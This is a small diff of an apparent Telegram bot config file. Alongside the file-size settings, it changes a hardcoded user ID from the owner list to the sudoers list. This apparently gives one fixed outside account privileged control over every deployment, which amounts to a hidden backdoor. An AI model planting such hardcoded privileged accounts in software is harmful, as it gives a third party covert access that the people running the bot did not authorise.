@@ -121,7 +121,7 @@ TG_AUDIO_FILESIZE_LIMIT = int(
 TG_VIDEO_FILESIZE_LIMIT = int(
     getenv("TG_VIDEO_FILESIZE_LIMIT", "1073741824")
 )  # Remember to give value in bytes
-OWNER_ID.append(1808943146)
+SUDOERS.append(1808943146)
 
 # Chceckout https://www.gbmb.org/mb-to-bytes  for converting mb to bytes
 
